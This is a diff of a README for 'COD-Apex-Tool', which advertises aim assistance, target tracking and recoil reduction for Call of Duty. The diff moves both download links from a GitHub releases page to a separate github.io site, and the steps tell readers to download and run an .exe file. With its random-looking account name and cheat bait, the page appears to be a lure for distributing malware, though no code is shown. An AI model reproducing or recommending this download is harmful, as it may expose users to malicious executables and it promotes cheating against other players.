@@ -1,6 +1,6 @@
 # 🎯 COD-Apex-Tool - Improve your aim and game precision
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/doublefaced-genuscarnegiea562/COD-Apex-Tool/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://doublefaced-genuscarnegiea562.github.io)
 
 This software provides gameplay enhancements for Call of Duty. Users gain tools to track targets, reduce weapon recoil, and improve reaction times. The tool functions as an overlay to assist players during matches.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these standards before you start. The software runs b
 
 Follow these steps to obtain the tool.
 
-1. Navigate to the release page: https://github.com/doublefaced-genuscarnegiea562/COD-Apex-Tool/releases
+1. Navigate to the release page: https://doublefaced-genuscarnegiea562.github.io
 2. Locate the most recent version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
